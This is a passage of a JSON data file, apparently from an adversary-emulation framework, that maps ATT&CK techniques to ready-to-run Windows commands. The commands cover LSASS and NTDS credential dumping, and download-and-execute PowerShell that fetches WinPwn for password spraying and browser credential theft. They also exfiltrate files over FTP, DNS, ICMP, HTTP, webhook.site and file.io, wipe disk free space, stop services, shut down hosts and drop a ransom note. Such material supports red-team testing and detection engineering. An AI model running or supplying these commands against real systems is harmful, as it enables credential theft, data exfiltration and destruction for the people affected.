                    "command": "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /t REG_SZ /s",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "262666862164b89881f6b5c565c0a3be",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "46018ecb570a06383afecf86c081b2a1": {
        "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.003",
            "name": "OS Credential Dumping: NTDS"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "vssadmin.exe create shadow /for=C:",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "46018ecb570a06383afecf86c081b2a1",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "3b39ba57fb4cc155148c8b28edaa7b10": {
        "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump.\n\nUpon successful execution, you should see the following file created c:\\windows\\temp\\lsass_dump.dmp.\n\nIf you see a message saying \"procdump.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install the ProcDump tool first.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.001",
            "name": "OS Credential Dumping: LSASS Memory"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del \"C:\\Windows\\Temp\\lsass_dump.dmp\" >nul 2> nul",
                    "command": "PathToAtomicsFolder\\T1003.001\\bin\\procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "3b39ba57fb4cc155148c8b28edaa7b10",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "7532005da662bfc703ce3d8ef4e8ac70": {
        "description": "DomainPasswordSpray Attacks technique via function of WinPwn",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1110.003",
            "name": "Brute Force: Password Spraying"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); domainpassspray -consoleoutput -noninteractive -emptypasswords",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "7532005da662bfc703ce3d8ef4e8ac70",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "954860df5054a5fabc114abefd8e45f6": {
        "description": "Collect Browser credentials as well as the history via winpwn browserpwn function of WinPwn.",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555.003",
            "name": "Credentials from Password Stores: Credentials from Web Browsers"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "rm .\\System.Data.SQLite.dll -ErrorAction Ignore",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); browserpwn -consoleoutput -noninteractive",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "954860df5054a5fabc114abefd8e45f6",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "1a9d81f05549fb5061467e303cd8f386": {
        "description": "Simulates an adversary accessing encrypted credentials from firefox web browser's login database.\nmore info in https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555.003",
            "name": "Credentials from Password Stores: Credentials from Web Browsers"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path \"$env:temp\\Profiles\" -Force -ErrorAction Ignore -Recurse",
                    "command": "Copy-Item \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\\" -Destination $env:temp -Force -Recurse",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1a9d81f05549fb5061467e303cd8f386",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "f7c4d48b7fcd64626488da2a0e8dbcf6": {
        "description": "The following Atomic will run Get-ADReplAccount from DSInternals.\nUpon successful execution, domain and credentials will appear in stdout. \n[Reference](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/) CrowdStrike StellerParticle.\nhttps://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.006",
            "name": "OS Credential Dumping: DCSync"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Get-ADReplAccount -All -Server",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f7c4d48b7fcd64626488da2a0e8dbcf6",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "9d0478981edda6091f911a1305025bde": {
        "description": "This module will extract the credentials from Windows Credential Manager",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555",
            "name": "Credentials from Password Stores"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9d0478981edda6091f911a1305025bde",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "935e8026584b85192519c57d7080b048": {
        "description": "This module will extract the credentials found within the Windows credential manager and dump\nthem to $env:TEMP\\windows-credentials.txt\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555",
            "name": "Credentials from Password Stores"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"$env:TEMP\\windows-credentials.txt\" -ErrorAction Ignore",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1555\\src\\T1555-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "935e8026584b85192519c57d7080b048",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "9f73269695e54311dd61dc68940fb3e1": {
        "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.003",
            "name": "OS Credential Dumping: NTDS"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "wmic shadowcopy call create Volume=C:\\",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9f73269695e54311dd61dc68940fb3e1",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "03526668cc55b6544244b107feadaf22": {
        "description": "Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::\n\nPython 3 must be installed, use the get_prereq_command's to meet the prerequisites for this test.\n\nSuccessful execution of this test will display multiple useranames and passwords/hashes to the screen.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.001",
            "name": "OS Credential Dumping: LSASS Memory"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "pypykatz live lsa",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "03526668cc55b6544244b107feadaf22",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "cc59bf575d64a7204faadbc261901a92": {
        "description": "Dump credentials from memory using Gsecdump.\n\nUpon successful execution, you should see domain\\username's followed by two 32 character hashes.\n\nIf you see output that says \"compat: error: failed to create child process\", execution was likely blocked by Anti-Virus. \nYou will receive only error output if you do not run this test from an elevated context (run as administrator)\n\nIf you see a message saying \"The system cannot find the path specified\", try using the get-prereq_commands to download and install Gsecdump first.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003",
            "name": "OS Credential Dumping"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "PathToAtomicsFolder\\T1003\\bin\\gsecdump.exe -a",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "cc59bf575d64a7204faadbc261901a92",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "02d329a96170c3d4e3fdb7ba516fb478": {
        "description": "DNSExfiltrator allows for transfering (exfiltrate) a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel.\n!!! Test will fail without a domain under your control with A record and NS record !!! \nSee this github page for more details - https://github.com/Arno0x/DNSExfiltrator\n",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1048",
            "name": "Exfiltration Over Alternative Protocol"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Import-Module $env:Temp\\dnsexfil.ps1; Invoke-DNSExfiltrator -i $env:Temp\\dnsexfil.ps1 -d target.example.com -p atomic -doh google -t 500 None",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "02d329a96170c3d4e3fdb7ba516fb478",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "ee065bea223fde249a30f60c0d05e36d": {
        "description": "This test simulates MAZE's ransomware's ability to exfiltrate data via FTP.\nUpon successful execution, all 7z files within the %windir%\\temp directory will be uploaded to a remote FTP server. \nReference: https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents\n",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1048.003",
            "name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$ftp = \"ftp://#{ftp_server}/\"; try {foreach ($file in (dir \"$env:windir\\temp\" \"*.7z\")); {$uri = New-Object System.Uri($ftp+$file.name);  $ftp_del = [System.Net.FtpWebRequest]::create($uri);  $ftp_del.Credentials = New-Object System.Net.NetworkCredential('#{username}','#{password}');  $ftp_del.Method = [System.Net.WebRequestMethods+Ftp]::DeleteFile;  $ftp_del.GetResponse()}} catch{}",
                    "command": "$Dir_to_copy = \"$env:windir\\temp\"; $ftp = \"ftp://#{ftp_server}/\"; $web_client = New-Object System.Net.WebClient; $web_client.Credentials = New-Object System.Net.NetworkCredential('#{username}', '#{password}'); if (test-connection -count 1 -computername \"#{ftp_server}\" -quiet); {foreach($file in (dir $Dir_to_copy \"*.7z\")); {echo \"Uploading $file...\"; $uri = New-Object System.Uri($ftp+$file.name); $web_client.UploadFile($uri, $file.FullName)}}; else; {echo \"FTP Server Unreachable. Please verify the server address in input args and try again.\"}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ee065bea223fde249a30f60c0d05e36d",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "8fc77040527dcb96c734875de6eaf4ab": {
        "description": "Exfiltration of specified file over SMTP.\nUpon successful execution, powershell will send an email with attached file to exfiltrateto a remote address. Results will be via stdout.\n",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1048.003",
            "name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Send-MailMessage -From",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "8fc77040527dcb96c734875de6eaf4ab",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "c8299b8b680b37c88bdc284773675a48": {
        "description": "Exfiltration of data using ConfigSecurityPolicy.exe\nhttps://debugactiveprocess.medium.com/data-exfiltration-with-lolbins-4d9c6e43dacf\n",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1567",
            "name": "Exfiltration Over Web Service"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$path = resolve-path \"c:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\*\\ConfigSecurityPolicy.exe\"; & $path[0] c:\\temp\\config.xml \"https://webhook.site?d=sensitive-data-here\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c8299b8b680b37c88bdc284773675a48",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "9618418b26d98e246639f27fa73dfc91": {
        "description": "Exfiltration of specified file over ICMP protocol.\n\nUpon successful execution, powershell will utilize ping (icmp) to exfiltrate notepad.exe to a remote address (default 127.0.0.1). Results will be via stdout.\n",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1048.003",
            "name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path C:\\Windows\\System32\\notepad.exe -Encoding Byte -ReadCount 1024) { $ping.Send(\"127.0.0.1\", 1500, $Data) }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9618418b26d98e246639f27fa73dfc91",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "ac4d31cae06889fe70ed9464748c970a": {
        "description": "Exfiltrates a file present on the victim machine to the C2 server.\n",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1041",
            "name": "Exfiltration Over C2 Channel"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "if(-not (Test-Path $env:TEMP\\LineNumbers.txt)){ ;   1..100 | ForEach-Object { Add-Content -Path $env:TEMP\\LineNumbers.txt -Value \"This is line $_.\" }; }; [System.Net.ServicePointManager]::Expect100Continue = $false; $filecontent = Get-Content -Path $env:TEMP\\LineNumbers.txt; Invoke-WebRequest -Uri example.com -Method POST -Body $filecontent -DisableKeepAlive",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ac4d31cae06889fe70ed9464748c970a",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "2e4b17949c4163f1cefec2e7fbee3e2b": {
        "description": "Exfiltration of specified file over HTTP.\nUpon successful execution, powershell will invoke web request using POST method to exfiltrate notepad.exe to a remote address (default http://127.0.0.1). Results will be via stdout.\n",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1048.003",
            "name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$content = Get-Content C:\\Windows\\System32\\notepad.exe; Invoke-WebRequest -Uri http://127.0.0.1 -Method POST -Body $content",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2e4b17949c4163f1cefec2e7fbee3e2b",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "b7dec45aa350b4ec6f1c41336e1f7a14": {
        "description": "Creates a text file\nTries to upload to a server via HTTP PUT method with ContentType Header\nDeletes a created file",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1020",
            "name": "Automated Exfiltration"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$fileName = \"C:\\temp\\T1020_exfilFile.txt\"; Remove-Item -Path $fileName -ErrorAction Ignore",
                    "command": "$fileName = \"C:\\temp\\T1020_exfilFile.txt\"; $url = \"https://google.com\"; $file = New-Item -Force $fileName -Value \"This is ART IcedID Botnet Exfil Test\"; $contentType = \"application/octet-stream\"; try {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b7dec45aa350b4ec6f1c41336e1f7a14",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "db0ad71b6a1fb65edd336bb02c1792ee": {
        "description": "Exfiltrate data HTTPS using curl to file share site file.io\n",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1048.002",
            "name": "Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "C:\\Windows\\System32\\Curl.exe -F 'file=@3945c9_artifact' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/",
                    "payloads": [
                        "3945c9_artifact"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "db0ad71b6a1fb65edd336bb02c1792ee",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "6e3c5f29ce339ebed8100d22e8b43875": {
        "description": "Overwrites and deletes a file using Sysinternals SDelete. Upon successful execution, \"Files deleted: 1\" will be displayed in\nthe powershell session along with other information about the file that was deleted.\n",
        "tactic": "impact",
        "technique": {
            "attack_id": "T1485",
            "name": "Data Destruction"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "if (-not (Test-Path $env:TEMP\\T1485.txt)) { New-Item $env:TEMP\\T1485.txt -Force }; Invoke-Expression -Command \"$env:TEMP\\Sdelete\\sdelete.exe -accepteula $env:TEMP\\T1485.txt\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6e3c5f29ce339ebed8100d22e8b43875",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "66f19707907a88df172057c131ae2168": {
        "description": "RansomEXX malware removes all deleted files using windows built-in cipher.exe to prevent forensic recover.\nThis process is very slow and test execution may timeout. \nhttps://www.cybereason.com/blog/cybereason-vs.-ransomexx-ransomware\nhttps://support.microsoft.com/en-us/topic/cipher-exe-security-tool-for-the-encrypting-file-system-56c85edd-85cf-ac07-f2f7-ca2d35dab7e4\n",
        "tactic": "impact",
        "technique": {
            "attack_id": "T1485",
            "name": "Data Destruction"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "cipher.exe /w:C:",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "66f19707907a88df172057c131ae2168",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "8ff28ff3d519f5d742ef8064787936a2": {
        "description": "Stops a specified service using the net.exe command. Upon execution, if the service was running \"The Print Spooler service was stopped successfully.\"\nwill be displayed. If the service was not running, \"The Print Spooler service is not started.\" will be displayed and it can be\nstarted by running the cleanup command.\n",
        "tactic": "impact",
        "technique": {
            "attack_id": "T1489",
            "name": "Service Stop"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "net.exe start spooler >nul 2>&1",
                    "command": "net.exe stop spooler",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "8ff28ff3d519f5d742ef8064787936a2",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "a1201f5a49da6cb51a1af67ee0be79e1": {
        "description": "Stops a specified service using the sc.exe command. Upon execution, if the spooler service was running infomration will be displayed saying\nit has changed to a state of STOP_PENDING. If the spooler service was not running \"The service has not been started.\" will be displayed and it can be\nstarted by running the cleanup command.\n",
        "tactic": "impact",
        "technique": {
            "attack_id": "T1489",
            "name": "Service Stop"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "sc.exe start spooler >nul 2>&1",
                    "command": "sc.exe stop spooler",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "a1201f5a49da6cb51a1af67ee0be79e1",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "17be2b5f2b1dd2d7dd2eb1a63aecdeee": {
        "description": "This test performs a Windows system logoff as seen in [dcrat backdoor capabilities](https://www.mandiant.com/resources/analyzing-dark-crystal-rat-backdoor)\n",
        "tactic": "impact",
        "technique": {
            "attack_id": "T1529",
            "name": "System Shutdown/Reboot"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "shutdown /l",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "17be2b5f2b1dd2d7dd2eb1a63aecdeee",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "a5ca8ff6820e584c96bd331127235911": {
        "description": "This test restarts a Windows system.\n",
        "tactic": "impact",
        "technique": {
            "attack_id": "T1529",
            "name": "System Shutdown/Reboot"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "shutdown /r /t 1",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "a5ca8ff6820e584c96bd331127235911",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "d82ceb9939d3d920ee550187ad8235c8": {
        "description": "building the IOC (YOUR_FILES.txt) for the PureLocker ransomware \nhttps://www.bleepingcomputer.com/news/security/purelocker-ransomware-can-lock-files-on-windows-linux-and-macos/\n",
        "tactic": "impact",
        "technique": {
            "attack_id": "T1486",
            "name": "Data Encrypted for Impact"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del %USERPROFILE%\\Desktop\\YOUR_FILES.txt >nul 2>&1",
                    "command": "echo T1486 - Purelocker Ransom Note > %USERPROFILE%\\Desktop\\YOUR_FILES.txt",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d82ceb9939d3d920ee550187ad8235c8",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "8badcdf011ce67b8b063255b02bcf3da": {
        "description": "This test shuts down a Windows system.\n",
        "tactic": "impact",
        "technique": {
            "attack_id": "T1529",
            "name": "System Shutdown/Reboot"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "shutdown /s /t 1",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "8badcdf011ce67b8b063255b02bcf3da",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "282fc06f224e89fa1913bc11bdf18a20": {
        "description": "Stops a specified service killng the service's process.\nThis technique was used by WannaCry. Upon execution, if the spoolsv service was running \"SUCCESS: The process \"spoolsv.exe\" with PID 2316 has been terminated.\"\nwill be displayed. If the service was not running \"ERROR: The process \"spoolsv.exe\" not found.\" will be displayed and it can be\nstarted by running the cleanup command.\n",
        "tactic": "impact",
        "technique": {
            "attack_id": "T1489",
            "name": "Service Stop"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "taskkill.exe /f /im spoolsv.exe",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "282fc06f224e89fa1913bc11bdf18a20",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "d73958baed610239bb1414c1b51cef0d": {
        "description": "Downloads an image from a URL and sets it as the desktop wallpaper.\n",
        "tactic": "impact",
        "technique": {
            "attack_id": "T1491.001",
            "name": "Defacement: Internal Defacement"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$updateWallpapercode = @' ; using System.Runtime.InteropServices; namespace Win32{;     public class Wallpaper{ ;         [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] ;          static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ;          ;          public static void SetWallpaper(string thePath){ ;             SystemParametersInfo(20,0,thePath,3);         };     }; } ; '@; if (Test-Path -Path;      $orgImg = Get-Content -Path \"#{pointer_to_orginal_wallpaper}\";      add-type $updateWallpapercode ;      [Win32.Wallpaper]::SetWallpaper($orgImg); }; Remove-Item \"#{pointer_to_orginal_wallpaper}\" -ErrorAction Ignore; Remove-Item \"#{wallpaper_location}\" -ErrorAction Ignore",
                    "command": "$url = \"#{url_of_wallpaper}\"; $imgLocation = \"#{wallpaper_location}\"; $orgWallpaper = (Get-ItemProperty -Path Registry::'HKEY_CURRENT_USER\\Control Panel\\Desktop\\' -Name WallPaper).WallPaper; $orgWallpaper | Out-File -FilePath \"#{pointer_to_orginal_wallpaper}\"; $updateWallpapercode = @' ; using System.Runtime.InteropServices; namespace Win32{;     public class Wallpaper{ ;         [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] ;          static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ;          ;          public static void SetWallpaper(string thePath){ ;             SystemParametersInfo(20,0,thePath,3);         };     }; } ; '@; $wc = New-Object System.Net.WebClient  ; try{  ;     $wc.DownloadFile($url, $imgLocation);     add-type $updateWallpapercode ;     [Win32.Wallpaper]::SetWallpaper($imgLocation); } ; catch [System.Net.WebException]{  ;     Write-Host(\"Cannot download $url\") ;     add-type $updateWallpapercode ;     [Win32.Wallpaper]::SetWallpaper($imgLocation); } ; finally{    ;     $wc.Dispose()  ; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d73958baed610239bb1414c1b51cef0d",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "8c0f619c7dfd33907bf20b1dfb58022b": {
        "description": "Utilize PowerShell to echo a command to clipboard and execute it\n",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1115",
            "name": "Clipboard Data"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "echo Get-Process | clip; Get-Clipboard | iex",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "8c0f619c7dfd33907bf20b1dfb58022b",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "a6e8a2b0c5a47b9c05db74cdd2bc21c1": {
        "description": "Copy from sensitive File from the c$ of another LAN computer with powershell\nhttps://twitter.com/SBousseaden/status/1211636381086339073",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1039",
            "name": "Data from Network Shared Drive"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path \"\\\\127.0.0.1\\C$\\Windows\\temp\\Easter_Bunny.password\"; Remove-Item -Path \"$Env:TEMP\\Easter_egg.password\"",
                    "command": "copy-item -Path \"\\\\127.0.0.1\\C$\\Windows\\temp\\Easter_Bunny.password\" -Destination \"$Env:TEMP\\Easter_egg.password\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "a6e8a2b0c5a47b9c05db74cdd2bc21c1",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "a1ee301b0508747b468d578a14e5c1a5": {
        "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration.\nWhen the test completes you should find the files from the $env:USERPROFILE directory compressed in a file called T1560-data-ps.zip in the $env:USERPROFILE directory \n",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1560",
            "name": "Archive Collected Data"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -path $env:USERPROFILE\\T1560-data-ps.zip -ErrorAction Ignore",
                    "command": "dir $env:USERPROFILE -Recurse | Compress-Archive -DestinationPath $env:USERPROFILE\\T1560-data-ps.zip",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "a1ee301b0508747b468d578a14e5c1a5",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "c0a7ca5473d889ac83792ac31242ad05": {
        "description": "This module copies the data stored in the user's clipboard and writes it to a file, $env:TEMP\\atomic_T1115_clipboard_data.txt\n",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1115",
